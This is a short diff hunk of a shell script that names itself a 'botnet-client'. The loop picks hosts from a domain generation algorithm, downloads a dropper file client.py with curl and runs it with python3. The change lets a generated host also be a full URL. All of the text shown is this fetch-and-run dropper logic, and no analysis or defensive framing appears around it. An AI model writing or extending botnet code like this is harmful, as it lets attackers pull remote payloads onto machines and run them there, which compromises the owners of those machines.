@@ -38,7 +38,11 @@ chmod +x /dga
 while true; do {
     host="`/dga | shuf -n1`"
     echo "botnet-client: dga: trying $host..."
-    url="http://$host/clients/droppers/client.py"
+    if [[ "$host" =~ ^https?:// ]]; then
+        url="$host"
+    else
+        url="http://$host/clients/droppers/client.py"
+    fi
     curl -sHf "$url" -o client.py && {
         echo "botnet-client: dga: $host works!"
         python3 client.py
